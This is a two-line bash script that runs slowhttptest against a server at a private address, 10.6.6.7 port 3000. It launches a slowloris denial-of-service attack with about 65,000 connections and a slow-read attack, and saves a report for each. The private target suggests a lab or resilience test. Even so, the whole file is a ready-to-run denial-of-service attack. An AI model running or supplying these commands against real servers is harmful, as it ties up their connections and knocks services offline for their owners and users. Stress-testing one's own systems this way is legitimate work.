#!/bin/bash

slowhttptest -c 65539 -H -g -o report-slowloris -i 10 -r 200 -t GET -u 'http://10.6.6.7:3000' -x 24 -p 3

slowhttptest -g -o report-slow-read -c 65539 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u 'http://10.6.6.7:3000' -p 5 -l 350
